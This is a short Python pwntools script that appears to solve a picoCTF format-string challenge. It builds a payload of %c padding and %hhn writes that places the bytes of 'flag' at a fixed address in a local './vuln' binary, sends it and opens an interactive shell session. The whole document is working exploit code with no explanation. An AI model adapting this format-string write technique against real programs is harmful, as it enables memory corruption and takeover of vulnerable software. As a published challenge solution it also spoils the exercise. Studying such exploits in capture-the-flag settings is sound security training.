from pwn import *
from struct import pack

# pr = remote('rhea.picoctf.net',55003)
pr = process('./vuln')

sus_addr = 0x404060
val = 0x67616c66
offset = 20     # (48 / 8) + 14

def split_and_sort_with_indices(val):
    # returns list of (original_index, value) sorted by value
    bytes_with_indices = [(i, (val >> (8 * i)) & 0xFF) for i in range(4)]
    return sorted(bytes_with_indices, key=lambda x: x[1])

diff_hhn = lambda i, j: ((i - j) % 256)

def create_payload(val, sus_addr, offset):
    sorted_bytes = split_and_sort_with_indices(val)
    payload = b""
    curr_printed = 0
    param_index = offset
    addrs_order = []  # will hold addresses in the same order as %hhn params

    for orig_index, value in sorted_bytes:
        need = diff_hhn(value, curr_printed)
        if need != 0:
            payload += f"%{need}c".encode()
            curr_printed = (curr_printed + need) % 256
        # always add the param specifier, even when need == 0
        payload += f"%{param_index}$hhn".encode()
        # remember which address corresponds to this param index
        addrs_order.append(sus_addr + orig_index)
        param_index += 1

    # pad to 8-byte boundary so appended addresses align nicely
    if len(payload) % 8 != 0:
        padding_length = 8 - (len(payload) % 8)
        payload += b"|" * padding_length

    # append addresses in the exact order we recorded
    for a in addrs_order:
        payload += pack("<Q", a)

    return payload

payload = create_payload(val, sus_addr, offset)
print("len payload:", len(payload))
print(payload)
pr.sendline(payload)
pr.interactive()
